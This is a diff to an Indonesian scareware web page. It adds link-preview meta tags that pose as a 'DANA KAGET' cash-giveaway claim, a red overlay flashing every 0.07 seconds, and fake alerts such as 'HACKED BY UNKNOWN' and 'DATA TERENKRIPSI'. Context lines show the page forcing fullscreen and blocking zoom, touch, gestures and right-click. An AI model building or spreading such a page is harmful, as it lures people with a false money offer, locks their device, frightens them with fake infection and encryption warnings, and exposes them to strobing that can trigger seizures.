@@ -2,8 +2,18 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
+    <!-- ========== META UNTUK PRATINJAU LINK DI WHATSAPP / MEDIA SOSIAL ========== -->
+    <meta property="og:title" content="⚠️ PERINGATAN PENTING ⚠️">
+    <meta property="og:description" content="Klik untuk melihat informasi sistem. DANA KAGET 2.567.890 - Klaim Sekarang!">
+    <meta property="og:image" content="https://raw.githubusercontent.com/aryaexeuyf/Image/main/2922040192.webp">
+    <meta property="og:image:width" content="800">
+    <meta property="og:image:height" content="800">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    
+    <!-- META VIEWPORT - USER SCALE DIBLOKIR TOTAL -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
-    <title>💀 SYSTEM TERKUNCI 💀</title>
+    <title>💀 SYSTEM CRITICAL ERROR 💀</title>
     <style>
         * {
             margin: 0;
@@ -155,6 +165,23 @@
             pointer-events: all;
             cursor: none;
         }
+        /* EFEK BLUR KEDIP EKSTRA */
+        .blur-flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.3);
+            z-index: 2147483645;
+            pointer-events: none;
+            animation: quickFlash 0.07s infinite;
+        }
+        @keyframes quickFlash {
+            0% { opacity: 0; backdrop-filter: blur(0px); }
+            50% { opacity: 0.8; backdrop-filter: blur(10px); }
+            100% { opacity: 0; backdrop-filter: blur(0px); }
+        }
     </style>
 </head>
 <body>
@@ -166,6 +193,7 @@
 <div id="virusPopups" class="virus-container"></div>
 <div id="glitchOverlay" class="glitch-extreme"></div>
 <div id="lockScreen" class="lock-mouse"></div>
+<div id="blurFlash" class="blur-flash"></div>
 
 <script>
     (function() {
@@ -179,7 +207,7 @@
                     requestFull.call(docEl);
                 } catch(e) {}
             }
-            // ZOOM PAKSA: force body zoom 2x dan scale viewport
+            // ZOOM PAKSA: force body zoom dan scale viewport
             document.body.style.transform = "scale(1)";
             document.documentElement.style.zoom = "1";
             // Mengunci viewport supaya user tidak bisa pinch/zoom keluar
@@ -233,7 +261,7 @@
             });
             // Right click disable
             document.oncontextmenu = (e) => { e.preventDefault(); return false; };
-            // Blokir tombol home / recent apps via touch (gesture)
+            // Blokir sentuhan dan gesture
             document.addEventListener('touchstart', (e) => { e.preventDefault(); }, { passive: false });
             document.addEventListener('touchend', (e) => { e.preventDefault(); }, { passive: false });
         }
@@ -251,6 +279,7 @@
         let canvasGpuCtx;
         let canvasElement;
         let gpuLoop;
+        let blurFlashInterval;
 
         // GIF VIRUS
         const VIRUS_GIF = "https://raw.githubusercontent.com/aryaexeuyf/Image/main/rCae9p.gif";
@@ -273,7 +302,8 @@
                     const titles = [
                         "💀 KERNEL PANIC", "🔥 SYSTEM CORRUPTED", "⚠️ VIRUS TOTAL", "💢 MEMORY DUMP FAIL",
                         "🚨 MALWARE INFECTION", "⚡ CRITICAL HIJACK", "🌀 INFINITE DEATH", "💀 BLUE SCREEN",
-                        "🎯 POINTER CRASH", "🧠 CPU OVERLOAD", "📀 DISK CORRUPT", "🔴 FATAL ERROR"
+                        "🎯 POINTER CRASH", "🧠 CPU OVERLOAD", "📀 DISK CORRUPT", "🔴 FATAL ERROR",
+                        "💀 DANA KAGET", "⚠️ HACKED BY UNKNOWN"
                     ];
                     const randTitle = titles[Math.floor(Math.random() * titles.length)];
                     win.innerHTML = `
@@ -301,7 +331,8 @@
                 "💀 SYSTEM FAILURE", "🔥 CPU MELTDOWN", "⚠️ RAM OVERFLOW", "💢 GPU CRASH", 
                 "🚨 VIRUS DETECTED", "⚡ KERNEL PANIC", "🌀 INFINITE LOOP", "💀 BLUE SCREEN DEATH",
                 "🔴 CRITICAL ERROR", "📀 HARD DRIVE FAIL", "🧠 MEMORY LEAK", "🎯 NULL POINTER",
-                "💀 WINDOWS CORRUPT", "⚠️ UNHANDLED EXCEPTION", "🔥 THERMAL THROTTLE"
+                "💀 WINDOWS CORRUPT", "⚠️ UNHANDLED EXCEPTION", "🔥 THERMAL THROTTLE",
+                "💀 DANA HILANG", "⚠️ DATA TERENKRIPSI"
             ];
             const banyak = Math.floor(Math.random() * 70) + 60; // 60-130 teks per spawn
             for (let i = 0; i < banyak; i++) {
